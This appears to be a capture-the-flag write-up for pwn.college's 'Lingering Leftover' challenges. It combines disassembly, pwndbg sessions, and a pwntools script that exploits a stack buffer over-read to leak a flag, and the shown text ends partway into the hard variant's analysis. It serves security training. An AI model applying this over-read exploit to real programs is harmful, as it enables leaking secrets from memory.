   0x0000000000002870 <+623>:   mov    rax,QWORD PTR fs:0x28
   0x0000000000002879 <+632>:   mov    QWORD PTR [rip+0x3900],rax        # 0x6180 <cv_>
   0x0000000000002880 <+639>:   jmp    0x2894 <challenge+659>
   0x0000000000002882 <+641>:   mov    rax,QWORD PTR [rip+0x38e7]        # 0x6170 <cp_>
   0x0000000000002889 <+648>:   sub    rax,0x8
   0x000000000000288d <+652>:   mov    QWORD PTR [rip+0x38dc],rax        # 0x6170 <cp_>
   0x0000000000002894 <+659>:   mov    rax,QWORD PTR [rip+0x38d5]        # 0x6170 <cp_>
   0x000000000000289b <+666>:   mov    rdx,QWORD PTR [rax]
   0x000000000000289e <+669>:   mov    rax,QWORD PTR [rip+0x38db]        # 0x6180 <cv_>
   0x00000000000028a5 <+676>:   cmp    rdx,rax
   0x00000000000028a8 <+679>:   jne    0x2882 <challenge+641>
   0x00000000000028aa <+681>:   lea    rdi,[rip+0xee7]        # 0x3798
   0x00000000000028b1 <+688>:   call   0x1130 <puts@plt>
   0x00000000000028b6 <+693>:   lea    rdi,[rip+0xf1b]        # 0x37d8
   0x00000000000028bd <+700>:   call   0x1130 <puts@plt>
   0x00000000000028c2 <+705>:   lea    rdi,[rip+0xf47]        # 0x3810
   0x00000000000028c9 <+712>:   call   0x1130 <puts@plt>
   0x00000000000028ce <+717>:   lea    rdi,[rip+0xf8c]        # 0x3861
   0x00000000000028d5 <+724>:   mov    eax,0x0
   0x00000000000028da <+729>:   call   0x1160 <printf@plt>
   0x00000000000028df <+734>:   lea    rax,[rbp-0x210]
   0x00000000000028e6 <+741>:   mov    rsi,rax
   0x00000000000028e9 <+744>:   lea    rdi,[rip+0xf80]        # 0x3870
   0x00000000000028f0 <+751>:   mov    eax,0x0
   0x00000000000028f5 <+756>:   call   0x11b0 <__isoc99_scanf@plt>
   0x00000000000028fa <+761>:   mov    rax,QWORD PTR [rbp-0x210]
   0x0000000000002901 <+768>:   mov    rsi,rax
   0x0000000000002904 <+771>:   lea    rdi,[rip+0xf6d]        # 0x3878
   0x000000000000290b <+778>:   mov    eax,0x0
   0x0000000000002910 <+783>:   call   0x1160 <printf@plt>
   0x0000000000002915 <+788>:   mov    rax,QWORD PTR [rbp-0x208]
   0x000000000000291c <+795>:   mov    rsi,rax
   0x000000000000291f <+798>:   lea    rdi,[rip+0xf82]        # 0x38a8
   0x0000000000002926 <+805>:   mov    eax,0x0
   0x000000000000292b <+810>:   call   0x1160 <printf@plt>
   0x0000000000002930 <+815>:   mov    rax,QWORD PTR [rbp-0x210]
   0x0000000000002937 <+822>:   lea    rdx,[rax-0x1ea]
   0x000000000000293e <+829>:   mov    rcx,QWORD PTR [rbp-0x210]
   0x0000000000002945 <+836>:   mov    rax,QWORD PTR [rbp-0x208]
   0x000000000000294c <+843>:   add    rax,rcx
   0x000000000000294f <+846>:   mov    rsi,rax
   0x0000000000002952 <+849>:   lea    rdi,[rip+0xf97]        # 0x38f0
   0x0000000000002959 <+856>:   mov    eax,0x0
   0x000000000000295e <+861>:   call   0x1160 <printf@plt>
   0x0000000000002963 <+866>:   mov    rdx,QWORD PTR [rbp-0x208]
   0x000000000000296a <+873>:   mov    rax,QWORD PTR [rbp-0x210]
   0x0000000000002971 <+880>:   add    rdx,rax
   0x0000000000002974 <+883>:   mov    rax,QWORD PTR [rip+0x3815]        # 0x6190 <rp_>
   0x000000000000297b <+890>:   sub    rdx,rax
   0x000000000000297e <+893>:   mov    rax,rdx
   0x0000000000002981 <+896>:   mov    rsi,rax
   0x0000000000002984 <+899>:   lea    rdi,[rip+0xfbd]        # 0x3948
   0x000000000000298b <+906>:   mov    eax,0x0
   0x0000000000002990 <+911>:   call   0x1160 <printf@plt>
   0x0000000000002995 <+916>:   lea    rdi,[rip+0xfec]        # 0x3988
   0x000000000000299c <+923>:   call   0x1130 <puts@plt>
   0x00000000000029a1 <+928>:   lea    rdi,[rip+0x1038]        # 0x39e0
   0x00000000000029a8 <+935>:   call   0x1130 <puts@plt>
   0x00000000000029ad <+940>:   lea    rdi,[rip+0x106c]        # 0x3a20
   0x00000000000029b4 <+947>:   call   0x1130 <puts@plt>
   0x00000000000029b9 <+952>:   lea    rdi,[rip+0x10b0]        # 0x3a70
   0x00000000000029c0 <+959>:   call   0x1130 <puts@plt>
   0x00000000000029c5 <+964>:   lea    rdi,[rip+0x10ec]        # 0x3ab8
   0x00000000000029cc <+971>:   call   0x1130 <puts@plt>
   0x00000000000029d1 <+976>:   lea    rdi,[rip+0x1128]        # 0x3b00
   0x00000000000029d8 <+983>:   call   0x1130 <puts@plt>
   0x00000000000029dd <+988>:   lea    rdi,[rip+0x116c]        # 0x3b50
   0x00000000000029e4 <+995>:   call   0x1130 <puts@plt>
   0x00000000000029e9 <+1000>:  lea    rdi,[rip+0x11b8]        # 0x3ba8
   0x00000000000029f0 <+1007>:  call   0x1130 <puts@plt>
   0x00000000000029f5 <+1012>:  lea    rdi,[rip+0x11fe]        # 0x3bfa
   0x00000000000029fc <+1019>:  call   0x1130 <puts@plt>
   0x0000000000002a01 <+1024>:  lea    rdi,[rip+0x1210]        # 0x3c18
   0x0000000000002a08 <+1031>:  call   0x1130 <puts@plt>
   0x0000000000002a0d <+1036>:  lea    rdi,[rip+0x1254]        # 0x3c68
   0x0000000000002a14 <+1043>:  call   0x1130 <puts@plt>
   0x0000000000002a19 <+1048>:  lea    rdi,[rip+0x1298]        # 0x3cb8
   0x0000000000002a20 <+1055>:  call   0x1130 <puts@plt>
   0x0000000000002a25 <+1060>:  lea    rdi,[rip+0x12d7]        # 0x3d03
   0x0000000000002a2c <+1067>:  call   0x1130 <puts@plt>
   0x0000000000002a31 <+1072>:  lea    rdi,[rip+0x12e8]        # 0x3d20
   0x0000000000002a38 <+1079>:  call   0x1130 <puts@plt>
   0x0000000000002a3d <+1084>:  lea    rdi,[rip+0x1324]        # 0x3d68
   0x0000000000002a44 <+1091>:  call   0x1130 <puts@plt>
   0x0000000000002a49 <+1096>:  lea    rdi,[rip+0x1368]        # 0x3db8
   0x0000000000002a50 <+1103>:  call   0x1130 <puts@plt>
   0x0000000000002a55 <+1108>:  lea    rdi,[rip+0x13ac]        # 0x3e08
   0x0000000000002a5c <+1115>:  call   0x1130 <puts@plt>
   0x0000000000002a61 <+1120>:  lea    rdi,[rip+0x13e8]        # 0x3e50
   0x0000000000002a68 <+1127>:  call   0x1130 <puts@plt>
   0x0000000000002a6d <+1132>:  lea    rdi,[rip+0x141c]        # 0x3e90
   0x0000000000002a74 <+1139>:  call   0x1130 <puts@plt>
   0x0000000000002a79 <+1144>:  lea    rdi,[rip+0x142f]        # 0x3eaf
   0x0000000000002a80 <+1151>:  call   0x1130 <puts@plt>
   0x0000000000002a85 <+1156>:  lea    rdi,[rip+0x142c]        # 0x3eb8
   0x0000000000002a8c <+1163>:  call   0x1130 <puts@plt>
   0x0000000000002a91 <+1168>:  lea    rdi,[rip+0x1448]        # 0x3ee0
   0x0000000000002a98 <+1175>:  call   0x1130 <puts@plt>
   0x0000000000002a9d <+1180>:  lea    rdi,[rip+0x146c]        # 0x3f10
   0x0000000000002aa4 <+1187>:  call   0x1130 <puts@plt>
   0x0000000000002aa9 <+1192>:  lea    rdi,[rip+0x148d]        # 0x3f3d
   0x0000000000002ab0 <+1199>:  call   0x1130 <puts@plt>
   0x0000000000002ab5 <+1204>:  lea    rdi,[rip+0x1491]        # 0x3f4d
   0x0000000000002abc <+1211>:  call   0x1130 <puts@plt>
   0x0000000000002ac1 <+1216>:  lea    rdi,[rip+0x85c]        # 0x3324
   0x0000000000002ac8 <+1223>:  call   0x1130 <puts@plt>
   0x0000000000002acd <+1228>:  lea    rdi,[rip+0x1484]        # 0x3f58
   0x0000000000002ad4 <+1235>:  call   0x1130 <puts@plt>
   0x0000000000002ad9 <+1240>:  lea    rdi,[rip+0x14c8]        # 0x3fa8
   0x0000000000002ae0 <+1247>:  call   0x1130 <puts@plt>
   0x0000000000002ae5 <+1252>:  lea    rdi,[rip+0x150c]        # 0x3ff8
   0x0000000000002aec <+1259>:  call   0x1130 <puts@plt>
   0x0000000000002af1 <+1264>:  lea    rdi,[rip+0x1550]        # 0x4048
   0x0000000000002af8 <+1271>:  call   0x1130 <puts@plt>
   0x0000000000002afd <+1276>:  lea    rdi,[rip+0x1584]        # 0x4088
   0x0000000000002b04 <+1283>:  call   0x1130 <puts@plt>
   0x0000000000002b09 <+1288>:  lea    rdi,[rip+0x15c8]        # 0x40d8
   0x0000000000002b10 <+1295>:  call   0x1130 <puts@plt>
   0x0000000000002b15 <+1300>:  lea    rdi,[rip+0x1614]        # 0x4130
   0x0000000000002b1c <+1307>:  call   0x1130 <puts@plt>
   0x0000000000002b21 <+1312>:  lea    rdi,[rip+0x1640]        # 0x4168
   0x0000000000002b28 <+1319>:  call   0x1130 <puts@plt>
   0x0000000000002b2d <+1324>:  mov    rdx,QWORD PTR [rip+0x365c]        # 0x6190 <rp_>
   0x0000000000002b34 <+1331>:  mov    rax,QWORD PTR [rbp-0x208]
   0x0000000000002b3b <+1338>:  sub    rdx,rax
   0x0000000000002b3e <+1341>:  mov    rax,QWORD PTR [rip+0x364b]        # 0x6190 <rp_>
   0x0000000000002b45 <+1348>:  mov    rsi,rax
   0x0000000000002b48 <+1351>:  lea    rdi,[rip+0x1669]        # 0x41b8
   0x0000000000002b4f <+1358>:  mov    eax,0x0
   0x0000000000002b54 <+1363>:  call   0x1160 <printf@plt>
   0x0000000000002b59 <+1368>:  lea    rdi,[rip+0x16a8]        # 0x4208
   0x0000000000002b60 <+1375>:  call   0x1130 <puts@plt>
   0x0000000000002b65 <+1380>:  mov    rax,QWORD PTR [rbp-0x210]
   0x0000000000002b6c <+1387>:  mov    rsi,rax
   0x0000000000002b6f <+1390>:  lea    rdi,[rip+0x16b2]        # 0x4228
   0x0000000000002b76 <+1397>:  mov    eax,0x0
   0x0000000000002b7b <+1402>:  call   0x1160 <printf@plt>
   0x0000000000002b80 <+1407>:  mov    rdx,QWORD PTR [rbp-0x210]
   0x0000000000002b87 <+1414>:  mov    rax,QWORD PTR [rbp-0x208]
   0x0000000000002b8e <+1421>:  mov    rsi,rax
   0x0000000000002b91 <+1424>:  mov    edi,0x0
   0x0000000000002b96 <+1429>:  call   0x1180 <read@plt>
   0x0000000000002b9b <+1434>:  mov    DWORD PTR [rbp-0x214],eax
   0x0000000000002ba1 <+1440>:  cmp    DWORD PTR [rbp-0x214],0x0
   0x0000000000002ba8 <+1447>:  jns    0x2bd6 <challenge+1493>
   0x0000000000002baa <+1449>:  call   0x1120 <__errno_location@plt>
   0x0000000000002baf <+1454>:  mov    eax,DWORD PTR [rax]
   0x0000000000002bb1 <+1456>:  mov    edi,eax
   0x0000000000002bb3 <+1458>:  call   0x11d0 <strerror@plt>
   0x0000000000002bb8 <+1463>:  mov    rsi,rax
   0x0000000000002bbb <+1466>:  lea    rdi,[rip+0x168e]        # 0x4250
   0x0000000000002bc2 <+1473>:  mov    eax,0x0
   0x0000000000002bc7 <+1478>:  call   0x1160 <printf@plt>
   0x0000000000002bcc <+1483>:  mov    edi,0x1
   0x0000000000002bd1 <+1488>:  call   0x11c0 <exit@plt>
   0x0000000000002bd6 <+1493>:  mov    eax,DWORD PTR [rbp-0x214]
   0x0000000000002bdc <+1499>:  mov    esi,eax
   0x0000000000002bde <+1501>:  lea    rdi,[rip+0x168f]        # 0x4274
   0x0000000000002be5 <+1508>:  mov    eax,0x0
   0x0000000000002bea <+1513>:  call   0x1160 <printf@plt>
   0x0000000000002bef <+1518>:  lea    rdi,[rip+0x1692]        # 0x4288
   0x0000000000002bf6 <+1525>:  call   0x1130 <puts@plt>
   0x0000000000002bfb <+1530>:  mov    rdx,QWORD PTR [rip+0x3586]        # 0x6188 <sz_>
   0x0000000000002c02 <+1537>:  mov    rax,QWORD PTR [rip+0x358f]        # 0x6198 <sp_>
   0x0000000000002c09 <+1544>:  mov    rsi,rdx
   0x0000000000002c0c <+1547>:  mov    rdi,rax
   0x0000000000002c0f <+1550>:  call   0x12c9 <DUMP_STACK>
   0x0000000000002c14 <+1555>:  lea    rdi,[rip+0x1696]        # 0x42b1
   0x0000000000002c1b <+1562>:  call   0x1130 <puts@plt>
   0x0000000000002c20 <+1567>:  mov    rax,QWORD PTR [rbp-0x208]
   0x0000000000002c27 <+1574>:  mov    rsi,rax
   0x0000000000002c2a <+1577>:  lea    rdi,[rip+0x169f]        # 0x42d0
   0x0000000000002c31 <+1584>:  mov    eax,0x0
   0x0000000000002c36 <+1589>:  call   0x1160 <printf@plt>
   0x0000000000002c3b <+1594>:  mov    rax,QWORD PTR [rip+0x3536]        # 0x6178 <bp_>
   0x0000000000002c42 <+1601>:  mov    rsi,rax
   0x0000000000002c45 <+1604>:  lea    rdi,[rip+0x16ac]        # 0x42f8
   0x0000000000002c4c <+1611>:  mov    eax,0x0
   0x0000000000002c51 <+1616>:  call   0x1160 <printf@plt>
   0x0000000000002c56 <+1621>:  mov    rax,QWORD PTR [rip+0x3533]        # 0x6190 <rp_>
   0x0000000000002c5d <+1628>:  mov    rsi,rax
   0x0000000000002c60 <+1631>:  lea    rdi,[rip+0x16c1]        # 0x4328
   0x0000000000002c67 <+1638>:  mov    eax,0x0
   0x0000000000002c6c <+1643>:  call   0x1160 <printf@plt>
   0x0000000000002c71 <+1648>:  mov    rax,QWORD PTR [rip+0x3518]        # 0x6190 <rp_>
   0x0000000000002c78 <+1655>:  mov    rax,QWORD PTR [rax]
   0x0000000000002c7b <+1658>:  mov    rsi,rax
   0x0000000000002c7e <+1661>:  lea    rdi,[rip+0x16e3]        # 0x4368
   0x0000000000002c85 <+1668>:  mov    eax,0x0
   0x0000000000002c8a <+1673>:  call   0x1160 <printf@plt>
   0x0000000000002c8f <+1678>:  mov    rax,QWORD PTR [rip+0x34da]        # 0x6170 <cp_>
   0x0000000000002c96 <+1685>:  mov    rsi,rax
   0x0000000000002c99 <+1688>:  lea    rdi,[rip+0x1700]        # 0x43a0
   0x0000000000002ca0 <+1695>:  mov    eax,0x0
   0x0000000000002ca5 <+1700>:  call   0x1160 <printf@plt>
   0x0000000000002caa <+1705>:  mov    rax,QWORD PTR [rip+0x34bf]        # 0x6170 <cp_>
   0x0000000000002cb1 <+1712>:  mov    rax,QWORD PTR [rax]
   0x0000000000002cb4 <+1715>:  mov    rsi,rax
   0x0000000000002cb7 <+1718>:  lea    rdi,[rip+0x1702]        # 0x43c0
   0x0000000000002cbe <+1725>:  mov    eax,0x0
   0x0000000000002cc3 <+1730>:  call   0x1160 <printf@plt>
   0x0000000000002cc8 <+1735>:  lea    rsi,[rip+0xfffffffffffff783]        # 0x2452 <win_authed>
   0x0000000000002ccf <+1742>:  lea    rdi,[rip+0x170a]        # 0x43e0
   0x0000000000002cd6 <+1749>:  mov    eax,0x0
   0x0000000000002cdb <+1754>:  call   0x1160 <printf@plt>
   0x0000000000002ce0 <+1759>:  mov    edi,0xa
   0x0000000000002ce5 <+1764>:  call   0x1110 <putchar@plt>
   0x0000000000002cea <+1769>:  lea    rdi,[rip+0x1717]        # 0x4408
   0x0000000000002cf1 <+1776>:  call   0x1130 <puts@plt>
   0x0000000000002cf6 <+1781>:  lea    rdi,[rip+0x175b]        # 0x4458
   0x0000000000002cfd <+1788>:  call   0x1130 <puts@plt>
   0x0000000000002d02 <+1793>:  mov    esi,0x0
   0x0000000000002d07 <+1798>:  lea    rdi,[rip+0x178a]        # 0x4498
   0x0000000000002d0e <+1805>:  mov    eax,0x0
   0x0000000000002d13 <+1810>:  call   0x1160 <printf@plt>
   0x0000000000002d18 <+1815>:  mov    eax,DWORD PTR [rbp-0x214]
   0x0000000000002d1e <+1821>:  movsxd rdx,eax
   0x0000000000002d21 <+1824>:  mov    rax,QWORD PTR [rbp-0x208]
   0x0000000000002d28 <+1831>:  add    rdx,rax
   0x0000000000002d2b <+1834>:  mov    rax,QWORD PTR [rip+0x345e]        # 0x6190 <rp_>
   0x0000000000002d32 <+1841>:  add    rax,0x2
   0x0000000000002d36 <+1845>:  cmp    rdx,rax
   0x0000000000002d39 <+1848>:  jbe    0x2d77 <challenge+1910>
   0x0000000000002d3b <+1850>:  lea    rdi,[rip+0x176e]        # 0x44b0
   0x0000000000002d42 <+1857>:  call   0x1130 <puts@plt>
   0x0000000000002d47 <+1862>:  lea    rdi,[rip+0x17ba]        # 0x4508
   0x0000000000002d4e <+1869>:  call   0x1130 <puts@plt>
   0x0000000000002d53 <+1874>:  lea    rdi,[rip+0x17fe]        # 0x4558
   0x0000000000002d5a <+1881>:  call   0x1130 <puts@plt>
   0x0000000000002d5f <+1886>:  lea    rdi,[rip+0x183a]        # 0x45a0
   0x0000000000002d66 <+1893>:  call   0x1130 <puts@plt>
   0x0000000000002d6b <+1898>:  lea    rdi,[rip+0x1873]        # 0x45e5
   0x0000000000002d72 <+1905>:  call   0x1130 <puts@plt>
   0x0000000000002d77 <+1910>:  mov    rax,QWORD PTR [rbp-0x208]
   0x0000000000002d7e <+1917>:  mov    rsi,rax
   0x0000000000002d81 <+1920>:  lea    rdi,[rip+0x1867]        # 0x45ef
   0x0000000000002d88 <+1927>:  mov    eax,0x0
   0x0000000000002d8d <+1932>:  call   0x1160 <printf@plt>
   0x0000000000002d92 <+1937>:  lea    rdi,[rip+0x1868]        # 0x4601
   0x0000000000002d99 <+1944>:  call   0x1130 <puts@plt>
   0x0000000000002d9e <+1949>:  mov    eax,0x0
   0x0000000000002da3 <+1954>:  mov    rcx,QWORD PTR [rbp-0x8]
   0x0000000000002da7 <+1958>:  xor    rcx,QWORD PTR fs:0x28
   0x0000000000002db0 <+1967>:  je     0x2db7 <challenge+1974>
   0x0000000000002db2 <+1969>:  call   0x1150 <__stack_chk_fail@plt>
   0x0000000000002db7 <+1974>:  leave
   0x0000000000002db8 <+1975>:  ret
End of assembler dump.
```

```
   0x0000000000002b80 <+1407>:  mov    rdx,QWORD PTR [rbp-0x210]
   0x0000000000002b87 <+1414>:  mov    rax,QWORD PTR [rbp-0x208]
   0x0000000000002b8e <+1421>:  mov    rsi,rax
   0x0000000000002b91 <+1424>:  mov    edi,0x0
   0x0000000000002b96 <+1429>:  call   0x1180 <read@plt>
```

Let's set another breakpoint at `challenge+1429` in order to get the location of our buffer.

```
pwndbg> break *(challenge+1429)
Breakpoint 2 at 0x2b96
```

```
pwndbg> run
Starting program: /challenge/lingering-leftover-easy 
###
### Welcome to /challenge/lingering-leftover-easy!
###


Breakpoint 1, 0x000057856777c5ba in verify_flag ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────────────────────────────────
 RAX  0x7ffe5dbd2e96 ◂— 0x57856777cec00000
 RBX  0x57856777cec0 (__libc_csu_init) ◂— endbr64 
 RCX  0xffffffff
 RDX  0x100
 RDI  0xffffffff
 RSI  0x7ffe5dbd2e96 ◂— 0x57856777cec00000
 R8   0xa
 R9   0x33
 R10  0
 R11  0x246
 R12  0x57856777b1e0 (_start) ◂— endbr64 
 R13  0x7ffe5dbd40d0 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffe5dbd2fa0 —▸ 0x7ffe5dbd3fe0 ◂— 0
 RSP  0x7ffe5dbd2e40 ◂— 0
 RIP  0x57856777c5ba (verify_flag+75) ◂— call read@plt
──────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x57856777c5ba <verify_flag+75>     call   read@plt                    <read@plt>
        fd: 0xffffffff
        buf: 0x7ffe5dbd2e96 ◂— 0x57856777cec00000
        nbytes: 0x100
 
   0x57856777c5bf <verify_flag+80>     lea    rdi, [rip + 0xc32]     RDI => 0x57856777d1f8 ◂— 'This challenge reads the flag file to verify it. D...'
   0x57856777c5c6 <verify_flag+87>     call   puts@plt                    <puts@plt>
 
   0x57856777c5cb <verify_flag+92>     lea    rax, [rbp - 0x160]
   0x57856777c5d2 <verify_flag+99>     add    rax, 0x56
   0x57856777c5d6 <verify_flag+103>    mov    rsi, rax
   0x57856777c5d9 <verify_flag+106>    lea    rdi, [rip + 0xc90]     RDI => 0x57856777d270 ◂— 'The flag was read into address %p.\n\n'
   0x57856777c5e0 <verify_flag+113>    mov    eax, 0                 EAX => 0
   0x57856777c5e5 <verify_flag+118>    call   printf@plt                  <printf@plt>
 
   0x57856777c5ea <verify_flag+123>    nop    
   0x57856777c5eb <verify_flag+124>    mov    rdx, qword ptr [rbp - 8]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffe5dbd2e40 ◂— 0
... ↓        6 skipped
07:0038│-128 0x7ffe5dbd2e78 —▸ 0x7d6e79f7b193 (_dl_add_to_namespace_list+35) ◂— lea rdx, [rbx + rbx*8]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x57856777c5ba verify_flag+75
   1   0x57856777ce7a main+193
   2   0x7d6e79d90083 __libc_start_main+243
   3   0x57856777b20e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [ ] Location of buffer
- [x] Location of the flag in the stack: `0x7ffe5dbd2e96`

```
pwndbg> c
Continuing.

# ---- snip ----

Payload size: 2

# ---- snip ----

Breakpoint 2, 0x000057856777cb96 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────────────────────────────────
*RAX  0x7ffe5dbd2da0 ◂— 0x76 /* 'v' */
 RBX  0x57856777cec0 (__libc_csu_init) ◂— endbr64 
*RCX  0
*RDX  2
*RDI  0
*RSI  0x7ffe5dbd2da0 ◂— 0x76 /* 'v' */
*R8   0x23
*R9   0x23
*R10  0x57856777e244 ◂— ' bytes)!\n'
 R11  0x246
 R12  0x57856777b1e0 (_start) ◂— endbr64 
 R13  0x7ffe5dbd40d0 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffe5dbd2fa0 —▸ 0x7ffe5dbd3fe0 ◂— 0
*RSP  0x7ffe5dbd2d60 ◂— 0x3000000010
*RIP  0x57856777cb96 (challenge+1429) ◂— call read@plt
──────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x57856777cb96 <challenge+1429>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/1)
        buf: 0x7ffe5dbd2da0 ◂— 0x76 /* 'v' */
        nbytes: 2
 
   0x57856777cb9b <challenge+1434>    mov    dword ptr [rbp - 0x214], eax
   0x57856777cba1 <challenge+1440>    cmp    dword ptr [rbp - 0x214], 0
   0x57856777cba8 <challenge+1447>    jns    challenge+1493              <challenge+1493>
 
   0x57856777cbaa <challenge+1449>    call   __errno_location@plt        <__errno_location@plt>
 
   0x57856777cbaf <challenge+1454>    mov    eax, dword ptr [rax]
   0x57856777cbb1 <challenge+1456>    mov    edi, eax
   0x57856777cbb3 <challenge+1458>    call   strerror@plt                <strerror@plt>
 
   0x57856777cbb8 <challenge+1463>    mov    rsi, rax
   0x57856777cbbb <challenge+1466>    lea    rdi, [rip + 0x168e]     RDI => 0x57856777e250 ◂— 'ERROR: Failed to read input -- %s!\n'
   0x57856777cbc2 <challenge+1473>    mov    eax, 0                  EAX => 0
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffe5dbd2d60 ◂— 0x3000000010
01:0008│-238 0x7ffe5dbd2d68 —▸ 0x7ffe5dbd40e8 —▸ 0x7ffe5dbd468e ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-230 0x7ffe5dbd2d70 —▸ 0x7ffe5dbd40d8 —▸ 0x7ffe5dbd466b ◂— '/challenge/lingering-leftover-easy'
03:0018│-228 0x7ffe5dbd2d78 ◂— 0x11c890400
04:0020│-220 0x7ffe5dbd2d80 ◂— 0
05:0028│-218 0x7ffe5dbd2d88 —▸ 0x7ffe5dbd2e96 ◂— 0x57856777cec00000
06:0030│-210 0x7ffe5dbd2d90 ◂— 2
07:0038│-208 0x7ffe5dbd2d98 —▸ 0x7ffe5dbd2da0 ◂— 0x76 /* 'v' */
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x57856777cb96 challenge+1429
   1   0x57856777ce98 main+223
   2   0x7d6e79d90083 __libc_start_main+243
   3   0x57856777b20e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [x] Location of buffer: `0x7ffe5dbd2da0`
- [x] Location of the flag in the stack: `0x7ffe5dbd2e96`

If we send our payload right upto the flag's address in the stack, we can cause a buffer over-read.

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

p = process('/challenge/lingering-leftover-easy')

# Initialize values
buffer_addr = 0x7ffe5dbd2da0
flag_addr = 0x7ffe5dbd2e96

# Calculate offset & payload_size
offset = flag_addr - buffer_addr
payload_size = offset

# Build payload
payload = b"A" * offset

# Send payload size
p.recvuntil(b'Payload size: ')
p.sendline(str(payload_size).encode())

# Send payload
p.recvuntil(b'bytes)!')
p.send(payload)

p.interactive() 
```

```
hacker@program-security~lingering-leftover-easy:/$ python ~/script.py 
[+] Starting local process '/challenge/lingering-leftover-easy': pid 28116
[*] Switching to interactive mode

[*] Process '/challenge/lingering-leftover-easy' stopped with exit code 0 (pid 28116)
You sent 246 bytes!
Let's see what happened with the stack:

# ---- snip ----

The program's memory status:
- the input buffer starts at 0x7ffedd8fedd0
- the saved frame pointer (of main) is at 0x7ffedd8fefd0
- the saved return address (previously to main) is at 0x7ffedd8fefd8
- the saved return address is now pointing to 0x61fe341e4e98.
- the canary is stored at 0x7ffedd8fefc8.
- the canary value is now 0xf8b9d7df959efa00.
- the address of win_authed() is 0x61fe341e4452.

If you have managed to overwrite the return address with the correct value,
challenge() will jump straight to win_authed() when it returns.
Let's try it now!

You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApwn.college{4mozEL4j0Z5S8ik08BznrRaq9fW.01MxMDL4ITM0EzW}

Goodbye!
### Goodbye!
[*] Got EOF while reading in interactive
$  
```

&nbsp;

## Lingering Leftover (Hard)

```
hacker@program-security~lingering-leftover-hard:/$ /challenge/lingering-leftover-hard 
###
### Welcome to /challenge/lingering-leftover-hard!
###

Payload size: 2
Send your payload (up to 2 bytes)!
aa
You said: aa
Goodbye!
### Goodbye!
```

Requirements:

- [ ] Location of buffer
- [ ] Location of the flag in the stack

### Binary Analysis

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x0000000000001100  __cxa_finalize@plt
0x0000000000001110  putchar@plt
0x0000000000001120  __errno_location@plt
0x0000000000001130  puts@plt
0x0000000000001140  write@plt
0x0000000000001150  __stack_chk_fail@plt
0x0000000000001160  printf@plt
0x0000000000001170  geteuid@plt
0x0000000000001180  read@plt
0x0000000000001190  setvbuf@plt
0x00000000000011a0  open@plt
0x00000000000011b0  __isoc99_scanf@plt
0x00000000000011c0  exit@plt
0x00000000000011d0  strerror@plt
0x00000000000011e0  _start
0x0000000000001210  deregister_tm_clones
0x0000000000001240  register_tm_clones
0x0000000000001280  __do_global_dtors_aux
0x00000000000012c0  frame_dummy
0x00000000000012c9  bin_padding
0x0000000000001ddf  win_authed
0x0000000000001efc  verify_flag
0x0000000000001f63  challenge
0x000000000000208d  main
0x00000000000021a0  __libc_csu_init
0x0000000000002210  __libc_csu_fini
0x0000000000002218  _fini
```

#### `verify_flag()`

```
pwndbg> disassemble verify_flag 
Dump of assembler code for function verify_flag:
   0x0000000000001efc <+0>:     endbr64
   0x0000000000001f00 <+4>:     push   rbp
   0x0000000000001f01 <+5>:     mov    rbp,rsp
   0x0000000000001f04 <+8>:     sub    rsp,0x170
   0x0000000000001f0b <+15>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000001f14 <+24>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000001f18 <+28>:    xor    eax,eax
   0x0000000000001f1a <+30>:    mov    esi,0x0
   0x0000000000001f1f <+35>:    lea    rdi,[rip+0x10fe]        # 0x3024
   0x0000000000001f26 <+42>:    mov    eax,0x0
   0x0000000000001f2b <+47>:    call   0x11a0 <open@plt>
   0x0000000000001f30 <+52>:    mov    ecx,eax
   0x0000000000001f32 <+54>:    lea    rax,[rbp-0x170]
   0x0000000000001f39 <+61>:    add    rax,0x5a
   0x0000000000001f3d <+65>:    mov    edx,0x100
   0x0000000000001f42 <+70>:    mov    rsi,rax
   0x0000000000001f45 <+73>:    mov    edi,ecx
   0x0000000000001f47 <+75>:    call   0x1180 <read@plt>
   0x0000000000001f4c <+80>:    nop
